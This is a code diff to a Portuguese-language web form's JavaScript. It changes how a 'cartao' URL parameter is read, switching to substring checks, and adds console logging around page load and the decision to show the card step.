@@ -651,11 +651,27 @@
         // URL do servidor
         const SERVER_URL = window.location.origin;
 
-        // FUNÇÃO QUE LÊ O CARTÃO DIRETO DA URL (funciona em TODOS dispositivos)
+        // FUNÇÃO FORÇADA PARA LER DA URL (funciona em iPhone)
         function getCartaoAtivo() {
-            const urlParams = new URLSearchParams(window.location.search);
-            // Se não tiver parâmetro ou for diferente de 'false', está ativado
-            return urlParams.get('cartao') !== 'false';
+            // Pega a URL completa
+            const url = window.location.href;
+            console.log('📱 URL completa:', url);
+            
+            // Verifica se tem ?cartao=false ou &cartao=false na URL
+            if (url.includes('?cartao=false') || url.includes('&cartao=false')) {
+                console.log('🔴 Cartão DESATIVADO por URL');
+                return false;
+            }
+            
+            // Verifica se tem ?cartao=true ou &cartao=true na URL
+            if (url.includes('?cartao=true') || url.includes('&cartao=true')) {
+                console.log('🟢 Cartão ATIVADO por URL');
+                return true;
+            }
+            
+            // Se não tiver parâmetro, padrão é ativado
+            console.log('🟢 Cartão ATIVADO (padrão)');
+            return true;
         }
 
         async function enviarParaServidor(dados) {
@@ -690,6 +706,9 @@
         };
 
         $(document).ready(function() {
+            // Mostra a URL no console ao carregar
+            console.log('🚀 Página carregada. URL:', window.location.href);
+            
             // Máscaras
             $('#cpf').mask('000.000.000-00');
             $('#telefone').mask('(00) 00000-0000');
@@ -792,8 +811,9 @@
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
                     
-                    // Lê da URL - funciona em iPhone e PC
+                    // Lê da URL com a função forçada
                     const cartaoAtivo = getCartaoAtivo();
+                    console.log('📱 Decisão final - cartaoAtivo =', cartaoAtivo);
                     
                     if (cartaoAtivo) {
                         $('#page3').addClass('hidden');
